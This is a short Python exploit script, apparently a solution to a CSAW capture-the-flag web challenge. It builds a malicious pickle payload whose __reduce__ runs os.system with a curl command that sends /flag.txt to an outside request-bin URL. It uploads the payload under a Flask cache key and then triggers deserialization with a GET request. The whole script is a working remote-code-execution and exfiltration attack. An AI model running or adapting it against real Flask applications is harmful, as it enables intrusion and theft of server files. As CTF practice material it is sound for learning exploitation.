from pwn import *
import requests
import pickle
import os

#  URL = "http://localhost:5000"
URL = "http://web.chal.csaw.io:5000"
CACHE_TARGET = "test29"

# I tried various ways to get a full shell but wasn't able to get the connection
# made back to my host, so I used command interpolation instead.
class RCE:
    def __reduce__(self):
        return os.system, ("curl https://postb.in/1599997843300-8184462329372 --data \"$(cat /flag.txt)\"",)

payload = b"!" + pickle.dumps(RCE())
files = { 'content': payload }
data = { 'title': 'flask_cache_view//'+CACHE_TARGET }
res = requests.post(URL, data=data, files=files)
log.success("Exploit payload uploaded")

log.success("Triggering exploit")
res = requests.get(URL+"/"+CACHE_TARGET)
print("GET", res.text)
